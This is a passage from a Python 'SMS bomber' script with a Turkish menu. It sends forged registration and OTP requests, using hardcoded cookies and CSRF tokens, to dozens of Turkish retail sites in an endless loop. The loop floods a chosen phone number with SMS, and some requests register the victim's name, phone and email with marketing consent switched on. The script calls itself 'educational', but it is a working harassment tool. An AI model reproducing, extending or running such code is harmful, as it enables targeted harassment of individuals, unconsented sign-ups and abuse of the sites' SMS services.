3A23%22%7D%2C%7B%22K%22%3A%22VLTVisitorC%22%2C%22V%22%3A%22%257B%2522data%2522%253A%257B%257D%257D%22%2C%22E%22%3A%222026-02-12%2023%3A56%3A23%22%7D%5D%7D; csrftoken=YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
            'origin': 'https://www.vakko.com',
            'referer': 'https://www.vakko.com/users/register/',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'x-csrftoken': 'YEXgtwHReXOA5CNLsg2M6xmdEogNlcC0vLX8Lj9LTxvZyBC79YQe7SBRgF4xk6kW',
            'x-kl-kis-ajax-request': 'Ajax_Request',
            }
            json_data = {
            'operationName': 'GENERATE_OTP',
            'variables': {
            'phone': f'+90{phone}',
            'challenge': 'a8e312c5-9cf2-4053-a13e-51d259b0d36f',
            'deviceUniqueId': 'web_f312069b-d80b-40d9-9db1-e5799461c3ae',
            },
            'query': 'mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n',
            }
            response = requests.post('https://www.tiklagelsin.com/user/graphql', headers=headers, json=json_data)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Tiklagelsin ====> https://www.tiklagelsin.com"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Tiklagelsin Arıza"+ Style.RESET_ALL)            
    def yatas():
        try:
                cookies = {
                'inCommerce.customer.info': '60b0fd06-c1e4-4154-bbff-748db9ab39ad',
                '_gcl_au': '1.1.1849608548.1709214025',
                'personaclick_session_code': 'MfyLGn9a4z',
                'personaclick_device_id': 'w1cgFltE6A',
                'personaclick_lazy_recommenders': 'true',
                'personaclick-popup-113': 'showed',
                '_ga': 'GA1.1.1956217479.1709214027',
                'columnSize': '3',
                'cto_bundle': 'o8G5Cl9UVW4wRE1wME9yVDdCdUtIM01iR2VzOHY1VXVhWkVZRGpZJTJGb2Q5T3RLNVZBQ1pOQTk1JTJGYjdJbDJhSll6N002MnlIZUc0bnlwWXhUQTVUU1NzMElxNWdRaFZaOTlnRTZMWmF6WGpGeVlTSHdkVTNuU3BkT29uJTJCVmNFMlpvTUY2VlI4QWQlMkZRY0ViNko3Z0o2Y3I5VFEwJTJGaWU4ZFdHbGhpWkowT3pHdG1Yb1lGWXd1Zmd6YW01YTlEa2E4aGY4SElMUTcyaDZnVGRDRzY4cmhnZDhnU2lmQSUzRCUzRA',
                'ccpa': 'fe09bc03-0fdc-c91b-ec8b-cc78b9f7fe31',
                '_ym_uid': '1709214029200592628',
                '_ym_d': '1709214029',
                '_clck': '10qi654%7C2%7Cfjo%7C0%7C1520',
                '_fbp': 'fb.2.1709214029384.313472450',
                '_tt_enable_cookie': '1',
                '_ttp': 'N79rR_2iT1B_qgKP9MBCMEYDhh8',
                '_ym_isad': '2',
                '__rtbh.uid': '%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22204944725%22%7D',
                '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22lpmkfxxlC97zFSPVdHw8%22%7D',
                '__RequestVerificationToken': 'yMdPVLWcS8E_L3oGnYjIl1giVZgZQI2AqKOf9_Va3Avjul0dusM1k8YjZdej5zdrmJ7t_qkOHbmg23g39BSJfDU-IgY1',
                '_ga_EDCCTYP3LQ': 'GS1.1.1709214027.1.1.1709214053.34.0.0',
                'personaclick_session_last_act': '1709214053578',
                '_clsk': 'ukvwc6%7C1709214053766%7C2%7C1%7Cw.clarity.ms%2Fcollect',
                'ccpu': 'mCLvgqGAFkM0.1709214055',
                'cookie_consent_level': '%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D',
                'cookie_consent_user_accepted': 'true',
                '_ga_4KM79XB6T8': 'GS1.1.1709214027.1.1.1709214065.22.0.0',
                }
                headers = {
                'authority': 'www.yatasbedding.com.tr',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                # 'cookie': 'inCommerce.customer.info=60b0fd06-c1e4-4154-bbff-748db9ab39ad; _gcl_au=1.1.1849608548.1709214025; personaclick_session_code=MfyLGn9a4z; personaclick_device_id=w1cgFltE6A; personaclick_lazy_recommenders=true; personaclick-popup-113=showed; _ga=GA1.1.1956217479.1709214027; columnSize=3; cto_bundle=o8G5Cl9UVW4wRE1wME9yVDdCdUtIM01iR2VzOHY1VXVhWkVZRGpZJTJGb2Q5T3RLNVZBQ1pOQTk1JTJGYjdJbDJhSll6N002MnlIZUc0bnlwWXhUQTVUU1NzMElxNWdRaFZaOTlnRTZMWmF6WGpGeVlTSHdkVTNuU3BkT29uJTJCVmNFMlpvTUY2VlI4QWQlMkZRY0ViNko3Z0o2Y3I5VFEwJTJGaWU4ZFdHbGhpWkowT3pHdG1Yb1lGWXd1Zmd6YW01YTlEa2E4aGY4SElMUTcyaDZnVGRDRzY4cmhnZDhnU2lmQSUzRCUzRA; ccpa=fe09bc03-0fdc-c91b-ec8b-cc78b9f7fe31; _ym_uid=1709214029200592628; _ym_d=1709214029; _clck=10qi654%7C2%7Cfjo%7C0%7C1520; _fbp=fb.2.1709214029384.313472450; _tt_enable_cookie=1; _ttp=N79rR_2iT1B_qgKP9MBCMEYDhh8; _ym_isad=2; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22204944725%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22lpmkfxxlC97zFSPVdHw8%22%7D; __RequestVerificationToken=yMdPVLWcS8E_L3oGnYjIl1giVZgZQI2AqKOf9_Va3Avjul0dusM1k8YjZdej5zdrmJ7t_qkOHbmg23g39BSJfDU-IgY1; _ga_EDCCTYP3LQ=GS1.1.1709214027.1.1.1709214053.34.0.0; personaclick_session_last_act=1709214053578; _clsk=ukvwc6%7C1709214053766%7C2%7C1%7Cw.clarity.ms%2Fcollect; ccpu=mCLvgqGAFkM0.1709214055; cookie_consent_level=%7B%22strictly-necessary%22%3Atrue%2C%22functionality%22%3Atrue%2C%22tracking%22%3Atrue%2C%22targeting%22%3Atrue%7D; cookie_consent_user_accepted=true; _ga_4KM79XB6T8=GS1.1.1709214027.1.1.1709214065.22.0.0',
                'origin': 'https://www.yatasbedding.com.tr',
                'referer': 'https://www.yatasbedding.com.tr/loginregister',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                }

                json_data = {
                'EmailPermission': True,
                'SmsPermission': True,
                'FirstName': f'{ad}',
                'LastName': f'{soyad}',
                'Phone': f'{phone}',
                'Email': f'{mail}',
                }

                response = requests.post(
                'https://www.yatasbedding.com.tr/Customer/SendRegisterCustomerPermissionWithModel',
                cookies=cookies,
                headers=headers,
                json=json_data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Yatasbedding ====> https://www.yatasbedding.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTWHITE_EX + "[-]" + "Yatasbedding Arıza"+ Style.RESET_ALL) 
    def mudo():
        try:
            headers = {
            'authority': 'www.mudo.com.tr',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            # 'cookie': 'csrftoken=7wTaZl5u8OvDux6c1CB6mRt25768Z8JKtQGgfZ55RMq46TsMGGQwZFVfQH6rjrj0; _pk_id.6.f3bc=4db35b46c263c906.1708802588.; osessionid=gh0uul8s37px2mkpswm4iq2x9ygb5gah; _pk_ref.6.f3bc=%5B%22%22%2C%22%22%2C1709040646%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.6.f3bc=1',
            'origin': 'https://www.mudo.com.tr',
            'referer': 'https://www.mudo.com.tr/users/register/?next=',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'x-csrftoken': 'jL7ebwLGqVCvcpTfgQUMzDfkClCd94lxF5UkraLh9TxWOLfPVU9ccrHxnVCwtnVN',
            'x-kl-kis-ajax-request': 'Ajax_Request',
            }

            json_data = {
            'email': f'{mail}',
            'sms_allowed': True,
            'email_allowed': True,
            'first_name': 'ASDASD',
            'last_name': 'Ssddsds',
            'date_of_birth': '2002-11-04',
            'gender': None,
            'confirm': True,
            'password': 'asdWEGHGD1@',
            'phone': f'{phone}',
            'add_loyalty': True,
            }

            response = requests.post('https://www.mudo.com.tr/users/register/', headers=headers, json=json_data)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Mudo ====> https://www.mudo.com.tr"+ Style.RESET_ALL)
        except:
            print(Fore.LIGHTRED_EX + "[-]" + "Mudo Arıza"+ Style.RESET_ALL)   
    while True:
        system("cls||clear")
        try:
            menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder \n\n 2- Programın Amacı Ve Çalışma Mantığı\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz." + Style.RESET_ALL)
            sleep(3)
            continue
        if menu == "2":
            system("cls||clear")
            print("Python'un Requests modülünü kullanarak sitelere istek gönderir.\nBu istekler sonucu sunucu telefonunuza sms gönderir.\nProje sadece Github'da proje olarak yayınlanmak için yapılmıştır. Eğitim amaçlıdır.\n\n")
            okudum = input("Menüye Dönmek İçin 'Enter' tuşuna Basınız...")
            if okudum == "":
                continue
        if menu == "1":
            system("cls||clear")
            ad = input("Herhangi Bir Ad Yazınız (bosluk olmadan soyad olmadan) : ")
            soyad = input("Soyad Yazınız : ")
            phone = input("Telefon Numarası Yazınız (0 Olmadan 5050050505 Formatında) : ")
            if len(phone) != 10:
                system("cls||clear")
                print(Fore.LIGHTRED_EX +"Telefon Numarası 10 haneli olmalıdır." + Style.RESET_ALL)
                continue
            else :
                system("cls||clear")    
                while True:
                    yatas()
                    Columbia()
                    Komagene()
                    salonrandevu()
                    intersport()
                    yargici()
                    naosstar()
                    vakko()
                    gap()
                    lacoste()
                    bizimtoptan()
                    beymen()
                    englishhome()
                    beymenclub()
                    wmf()
                    network()
                    panco()
                    ardenmarket()
                    ozdilekteyim()
                    Paybol()
                    atasay()
                    damattween()
                    kigili()
                    superstep()
                    yargici()
                    mudo()
                    tiklagelsin()
                    filemarket()
                    kimgbister()
                    karaca()
                    flormar()
                    derimod()
                    koton()
                    
        if menu == "3":
            exit(0)
